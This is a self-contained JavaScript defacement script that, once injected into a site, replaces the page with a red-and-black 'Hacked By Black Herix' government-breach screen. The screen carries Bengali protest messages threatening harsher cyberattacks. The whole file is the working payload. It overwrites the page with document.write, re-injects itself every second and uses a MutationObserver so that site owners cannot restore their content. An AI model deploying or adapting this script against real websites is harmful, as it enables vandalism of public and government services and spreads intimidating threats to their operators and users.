(function() {
    const defaceHTML = `
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>GOVERNMENT SECURITY BREACH</title>
    <style>
        :root {
            --red: #ff0000;
            --green: #ff0000;   /* সবুজকে লাল করে পুরো থিম লাল-কালো ভয়ানক রূপ */
            --dark: #000000;
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body, html {
            height: 100%; width: 100%; overflow-y: auto; overflow-x: hidden;
            background: #000; color: var(--red); font-family: 'Courier New', monospace;
            cursor: crosshair;
        }

        .crt-scanlines {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 999999; opacity: 0.2;
            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.05) 0px, rgba(255,0,0,0.05) 2px, transparent 2px, transparent 4px);
        }

        .noise-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 999998; opacity: 0.04;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.5'/%3E%3C/svg%3E");
            background-size: 150px 150px;
        }

        .vignette {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 999997;
            background: radial-gradient(ellipse at center, rgba(0,0,0,0) 30%, rgba(0,0,0,0.9) 100%);
        }

        #matrix-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0; pointer-events: none; opacity: 0.3;
        }

        .particles-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none;
        }

        .particle {
            position: absolute; color: var(--red); font-size: 1.2rem; opacity: 0;
            animation: floatUp 10s linear infinite; text-shadow: 0 0 8px var(--red);
        }

        @keyframes floatUp {
            0% { transform: translateY(110vh) translateX(0) rotate(0deg); opacity: 0; }
            10% { opacity: 0.8; }
            60% { opacity: 0.3; }
            100% { transform: translateY(-10vh) translateX(40px) rotate(180deg); opacity: 0; }
        }

        .wrapper {
            position: relative; z-index: 5; max-width: 700px; margin: 0 auto;
            padding: 30px 16px 40px; text-align: center; width: 100%; min-height: 100vh;
            display: flex; flex-direction: column; align-items: center; justify-content: flex-start;
        }

        .alert-banner {
            border: 2px solid var(--red); background: rgba(20,0,0,0.9); padding: 10px 16px;
            margin-bottom: 25px; font-weight: bold; font-size: 0.8rem; letter-spacing: 2px;
            color: var(--red); text-shadow: 0 0 10px var(--red); box-shadow: 0 0 25px rgba(255,0,0,0.5);
            animation: blink 2s infinite;
        }

        .glitch-img-container {
            position: relative; display: inline-block; margin: 20px 0 30px;
            width: 160px; height: 160px;
        }
        .glitch-img-container img {
            width: 100%; height: 100%; object-fit: cover; display: block;
            filter: contrast(1.2) brightness(0.8);
        }
        .glitch-img-container::before,
        .glitch-img-container::after {
            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: inherit; opacity: 0.6; mix-blend-mode: screen;
        }
        .glitch-img-container::before {
            background: url('https://i.ibb.co/sp3450B5/1000024127.jpg') center/cover;
            clip-path: inset(10% 0 40% 0); transform: translate(-3px, 0);
            animation: glitchRed 3s infinite; filter: hue-rotate(300deg) saturate(3);
        }
        .glitch-img-container::after {
            background: url('https://i.ibb.co/sp3450B5/1000024127.jpg') center/cover;
            clip-path: inset(50% 0 10% 0); transform: translate(3px, 0);
            animation: glitchGreen 3s infinite; filter: hue-rotate(100deg) saturate(3);
        }
        @keyframes glitchRed {
            0%, 100% { clip-path: inset(10% 0 40% 0); transform: translate(-3px, 0); }
            20% { clip-path: inset(30% 0 20% 0); transform: translate(2px, -1px); }
            40% { clip-path: inset(15% 0 35% 0); transform: translate(-1px, 1px); }
            60% { clip-path: inset(40% 0 10% 0); transform: translate(3px, 0); }
            80% { clip-path: inset(5% 0 45% 0); transform: translate(-2px, -1px); }
        }
        @keyframes glitchGreen {
            0%, 100% { clip-path: inset(50% 0 10% 0); transform: translate(3px, 0); }
            20% { clip-path: inset(20% 0 30% 0); transform: translate(-2px, 1px); }
            40% { clip-path: inset(35% 0 15% 0); transform: translate(1px, -1px); }
            60% { clip-path: inset(10% 0 40% 0); transform: translate(-3px, 0); }
            80% { clip-path: inset(45% 0 5% 0); transform: translate(2px, 1px); }
        }

        .hacker-title {
            font-size: 2rem; font-weight: 900; color: #fff;
            text-shadow: 0 0 10px var(--red), 0 0 20px var(--red), 2px 2px 0 var(--red);
            margin-bottom: 20px; letter-spacing: 2px;
            animation: textFlicker 2s infinite;
        }
        @keyframes textFlicker {
            0%, 100% { opacity: 1; }
            40% { opacity: 0.9; text-shadow: 0 0 15px var(--red), 0 0 25px var(--red); }
            60% { opacity: 1; }
            80% { opacity: 0.8; text-shadow: 0 0 5px var(--red); }
        }

        .floating-messages {
            max-width: 600px; width: 100%; margin: 15px 0 25px;
            overflow: hidden; position: relative; height: 180px;
            border-top: 1px solid var(--red); border-bottom: 1px solid var(--red);
            background: rgba(10,0,0,0.5);
            padding: 10px 0;
        }
        .msg-scroll {
            animation: scrollUp 20s linear infinite;
        }
        @keyframes scrollUp {
            0% { transform: translateY(100%); }
            100% { transform: translateY(-100%); }
        }
        .msg-item {
            padding: 8px 12px; font-size: 0.9rem; font-weight: bold;
            color: var(--red); text-shadow: 0 0 6px var(--red);
            border-left: 3px solid var(--red); margin: 10px 0; text-align: left;
            background: rgba(30,0,0,0.3);
        }
        .msg-item.alt {
            color: #ff4444;
            border-left-color: #ff4444;
        }

        .ultimatum {
            border: 2px dashed var(--red); background: rgba(20,0,0,0.7); padding: 18px 10px;
            max-width: 600px; width: 100%; margin: 20px 0; color: var(--red); font-weight: bold;
            text-shadow: 0 0 8px var(--red); letter-spacing: 1px; line-height: 1.6;
            box-shadow: 0 0 25px rgba(255,0,0,0.3); position: relative;
        }
        .ultimatum::before {
            content: "⛔ সতর্কতা ⛔"; position: absolute; top: -14px; left: 50%;
            transform: translateX(-50%); background: #000; padding: 2px 14px;
            color: var(--red); font-size: 0.7rem; letter-spacing: 2px;
            border: 1px solid var(--red); text-shadow: 0 0 6px var(--red);
        }

        .click-hint {
            margin-top: 15px; font-size: 0.7rem; color: #666; animation: blink 2s infinite;
            border-bottom: 1px dotted var(--red); padding-bottom: 4px;
        }

        .status-bar {
            margin-top: 20px; display: flex; flex-wrap: wrap; justify-content: center;
            gap: 10px; font-size: 0.6rem; color: var(--red); letter-spacing: 1px;
            border-top: 1px solid var(--red); padding-top: 15px;
        }
        .status-bar span { background: rgba(255,0,0,0.1); padding: 3px 10px; border-radius: 2px; }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }

        @media (min-width: 600px) {
            .hacker-title { font-size: 2.8rem; }
            .glitch-img-container { width: 200px; height: 200px; }
        }
    </style>
</head>
<body>
    <audio id="bg-music" loop preload="none">
        <source src="https://files.catbox.moe/tcj7j8.mp3" type="audio/mpeg">
    </audio>
    <div class="crt-scanlines"></div>
    <div class="noise-overlay"></div>
    <div class="vignette"></div>
    <canvas id="matrix-canvas"></canvas>
    <div class="particles-container" id="particles-container"></div>

    <div class="wrapper">
        <div class="alert-banner">!!! GOVERNMENT NETWORK BREACHED !!!</div>

        <div class="glitch-img-container">
            <img src="https://i.ibb.co/sp3450B5/1000024127.jpg" alt="Target">
        </div>

        <h1 class="hacker-title">Hacked By Black Herix</h1>

        <div class="floating-messages">
            <div class="msg-scroll" id="msg-scroll"></div>
        </div>

        <div class="ultimatum">
            সরকারি কর্তৃপক্ষের প্রতি: আপনাদের অনলাইন অবকাঠামো নিরাপত্তাহীন। আমরা কোনো ক্ষতি করতে আসিনি, কিন্তু সতর্ক করতে এসেছি। যদি নিরাপত্তা না বাড়ান, তাহলে পরবর্তী আক্রমণ আরো ধ্বংসাত্মক হবে। এটা কোনো হুমকি নয় – বাস্তবতা।
        </div>

        <p class="click-hint">[ পেজে ক্লিক করলে সতর্ক সংকেত বাজবে ]</p>

        <div class="status-bar">
            <span>TRACE: FAILED</span>
            <span>IP: SPOOFED</span>
            <span>CREW: BLACK HERIX</span>
            <span>MOTIVE: AWARENESS</span>
        </div>
    </div>
</body>
</html>
`;

    // ইনজেক্ট ও স্টার্ট ইফেক্ট
    function injectDeface() {
        if (document.documentElement.innerHTML !== defaceHTML) {
            document.open();
            document.write(defaceHTML);
            document.close();
            startEffects();
            fillMessages(); // মেসেজ পূরণ
        }
    }

    // মেসেজের তালিকা
    function fillMessages() {
        const container = document.getElementById('msg-scroll');
        if (!container) return;
        const messages = [
            "তো কেয়া হাল হে ভাইলোগ",
            "আবারো একটি নিশংস ধর্ষণের বিচারের জন্য মাঠে নামলাম 😅",
            "আগেরবার মুখোশ পরা ছিল এবার আর কোন মুখোশ নাই আমার প্রিয় সরকার 😘",
            "এই নিশংসতার ও সঠিক বিচার চাই রামিসা হত্যার বিচারের মত",
            "নয়তো আগেরবারের চাইতেও এবারকার সাইবার প্রতিবাদ অনেক ভয়ানক হবে",
            "পারলে থামায়েন আর না হয় সঠিক বিচার করিয়েন",
            "মির্জাপুর সাইবার টিম সব সময় সত্যের পথে আছি",
            "এবং ইনশাল্লাহ সারা জীবন থাকবো",
            "আল্লাহ হাফেজ"
        ];
        let html = '';
        // লুপ করে আইটেম তৈরি, বারবার স্ক্রোলের জন্য কয়েকবার রিপিট
        for (let i = 0; i < 3; i++) {
            messages.forEach((msg, idx) => {
                html += `<div class="msg-item${idx % 2 === 0 ? '' : ' alt'}">${msg}</div>`;
            });
        }
        container.innerHTML = html;
    }

    function startEffects() {
        const canvas = document.getElementById('matrix-canvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        let width, height, columns, drops, fontSize;
        let lastTime = 0;
        const fpsInterval = 1000 / 10;

        function resizeMatrix() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
            fontSize = (width < 400) ? 10 : 14;
            columns = Math.floor(width / fontSize);
            drops = new Array(columns).fill(1);
        }

        function drawMatrix(timestamp) {
            if (timestamp - lastTime < fpsInterval) {
                requestAnimationFrame(drawMatrix);
                return;
            }
            lastTime = timestamp;
            ctx.fillStyle = 'rgba(0, 0, 0, 0.12)';
            ctx.fillRect(0, 0, width, height);
            ctx.fillStyle = '#ff0000';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const char = String.fromCharCode(0x30A0 + Math.random() * 96);
                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > height && Math.random() > 0.98) drops[i] = 0;
                drops[i]++;
            }
            requestAnimationFrame(drawMatrix);
        }
        resizeMatrix();
        requestAnimationFrame(drawMatrix);

        const container = document.getElementById('particles-container');
        const symbols = ['☠', '⚠', '✖', '⬤'];
        setInterval(() => {
            if (!container) return;
            const particle = document.createElement('span');
            particle.classList.add('particle');
            particle.textContent = symbols[Math.floor(Math.random() * symbols.length)];
            particle.style.left = Math.random() * 90 + '%';
            particle.style.animationDuration = (Math.random() * 8 + 6) + 's';
            container.appendChild(particle);
            setTimeout(() => particle.remove(), 10000);
        }, 2800);
    }

    // অটো-ইনজেকশন ও পুনরায় লক
    injectDeface();
    setInterval(injectDeface, 1000);
    const observer = new MutationObserver(injectDeface);
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // অডিও ট্রিগার
    document.addEventListener('click', function() {
        const audio = document.getElementById('bg-music');
        if (audio) { audio.play().catch(e => console.log("Audio blocked")); }
    });
})();
